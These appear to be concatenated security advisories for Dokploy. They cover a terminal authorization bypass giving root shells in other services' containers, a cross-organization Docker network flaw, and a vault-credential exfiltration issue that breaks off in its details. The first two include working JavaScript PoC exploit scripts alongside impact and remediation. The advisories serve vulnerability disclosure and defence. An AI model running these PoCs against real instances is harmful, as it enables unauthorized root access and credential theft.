### Summary

The fix for CVE-2026-72864 (GHSA-899j-cjwp-v4gw, v0.29.13) added a `serviceId` authorization path to `/docker-container-terminal`: when `serviceId` is present, the endpoint checks read access on that service and returns true. It never correlates the target `containerId` with the granted service. A member holding read access to a single service opens an interactive root shell (`docker exec -it ... sh`) in any container of the organization, including database containers of services they cannot access.

### Details

`apps/dokploy/server/wss/authorize.ts:39-46`:

```ts
if (serviceId) {
    try {
        await checkServiceAccess(ctx, serviceId, "read");
        return true;   // no check binds containerId to the granted service
    } catch { return false; }
}
```

`apps/dokploy/server/wss/docker-container-terminal.ts:33-36`: `containerId` and `serviceId` are independent query-string parameters. The remaining org check applies to `serverId` only (lines 70-75); the attacker stays in the same org anyway. `containerId`/`shell` pass charset validation (blocks injection, the CVE-2026-24841 class) but nothing validates **ownership**.

Same gap in `docker-container-logs.ts` (logs of any container) and `docker-stats.ts`.

### PoC

Verified on a live v0.30.0 instance. Attacker: member with accessedServices = [one nginx compose service]; no access to the victim database service.

```js
const ws = new WebSocket(
  `wss://<host>/docker-container-terminal?containerId=<victim postgres containerId>&activeWay=sh&serviceId=<granted gate serviceId>`
);
ws.binaryType = "arraybuffer";
ws.onopen = () => setTimeout(() => ws.send('whoami; hostname\n'), 2000);
ws.onmessage = (e) => console.log(typeof e.data === "string" ? e.data : new TextDecoder().decode(e.data));
```

(The 2-second delay waits for the PTY to attach; input sent too early is dropped.)

Output received by the attacker:

![terminal exploit output](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/image.png)

`whoami` returns **root** and the hostname matches the victim container ID - an interactive root shell inside the database container of an unauthorized service. The current user has no permission on the victim container yet executes commands in it.

UI context - the attacker's granted service and its legitimate terminal dialog:

![attacker gate containers](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/vuln07-01-attacker-gate-containers-context.jpeg)

### Impact

In a multi-member org, any member with read access to one service gets root shells on every container in the org: other projects' databases, internal apps. Read/modify data, plant backdoors, harvest DB credentials; restart policies make access persistent. Does not cross organizations (serverId org check holds) - the blast radius is the org's whole container estate. This is the same member-to-root-in-arbitrary-containers class accepted as Critical 9.9 for CVE-2026-72864; the fix closed the unauthenticated local branch but the serviceId path still bypasses scoping.

### Affected versions

v0.29.13 through v0.30.0 (introduced by the CVE-2026-72864 fix).

### Remediation

When serviceId is present, resolve the target container to its owning service (match `com.docker.compose.project` / swarm service name against the serviceId's appName) and reject mismatches. Or drop the serviceId path entirely and require docker:read plus getAccessibleServerIds for every terminal connection. Apply the same to docker-container-logs and docker-stats.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8 High; S:C in multi-tenant) - CWE-862.

### Summary

A logged in member can make Dokploy run Docker network actions on a server owned by another organization.

The network routes accept a `serverId` from the request, but do not check that the server belongs to the active organization. A member who knows a foreign `serverId` can list networks, create a network, import a network, inspect it, and remove an unused network.

Severity is medium when the foreign server id must be guessed, and high when server ids are exposed.

### Details

In `apps/dokploy/server/api/routers/network.ts`, the network routes accept a caller supplied `serverId` and use only `protectedProcedure`:

```ts
create: protectedProcedure
	.input(apiCreateNetwork)
	.mutation(async ({ ctx, input }) => {
		return createNetwork(input, ctx.session.activeOrganizationId);
	}),
```

In `packages/server/src/services/network.ts`, that server id is used for the Docker connection:

```ts
const docker = await getRemoteDocker(serverId);
await docker.createNetwork({ Name: row.name, Driver: row.driver });
```

`getRemoteDocker` looks up the server by id only. It does not check that the server belongs to the active organization. The same missing check affects network listing and import.

### PoC

I tested this on Dokploy `v0.30.0`.

Log in as a member of organization A, get a `serverId` from organization B, replace the values below, and run this with Node 18 or later.

```js
(async () => {
	const HOST = "http://localhost:3000";
	const session = "BETTER_AUTH_SESSION_TOKEN";
	const serverId = "SERVER_ID_FROM_ORG_B";
	const name = `pocnetwork${Date.now()}`;
	const headers = {
		"Content-Type": "application/json",
		Cookie: `better-auth.session_token=${session}`,
	};

	const createResponse = await fetch(`${HOST}/api/trpc/network.create`, {
		method: "POST",
		headers,
		body: JSON.stringify({ json: { name, serverId } }),
	});
	if (!createResponse.ok) {
		throw new Error(await createResponse.text());
	}

	const created = await createResponse.json();
	console.log(created);

	const networkId = created.result.data.json.networkId;
	await fetch(`${HOST}/api/trpc/network.remove`, {
		method: "POST",
		headers,
		body: JSON.stringify({ json: { networkId } }),
	});
})().catch(console.error);
```

The create response contains the new network row. The Docker network is created on organization B's server, then the second request removes the test network.

### Impact

This is an authorization bug.

Any logged in member who knows a server id from another organization can cause Docker network changes on that server. This can expose network names and settings, add a network to the host, or remove an unused network.

The main affected parties are organizations that share a Dokploy installation and use separate servers or remote Docker hosts.

### Summary

A user holding a delegated `vaultProvider` role can exfiltrate the organization's external secret-store credential (HashiCorp Vault token, Infisical machine-identity client secret, Scaleway secret key) to a server they control.

Vault secrets are write-only by design: the read path replaces them with a mask. That mask is the **constant string `********`**, and the config merge restores the real stored secret whenever an incoming config carries it. The merge validates only that `providerType` is unchanged - it never validates the endpoint URL, which sits in the same object and is fully caller-controlled. Echo the mask, change the URL, and Dokploy sends the real credential to the attacker's host.

Introduced with the vault subsystem on 2026-08-10, first shipped in `v0.30.0`. Not covered by any existing advisory.

### Details

`packages/server/src/services/vault-provider.ts:16` - the mask is a constant:

```ts
export const VAULT_SECRET_MASK = "********";
```

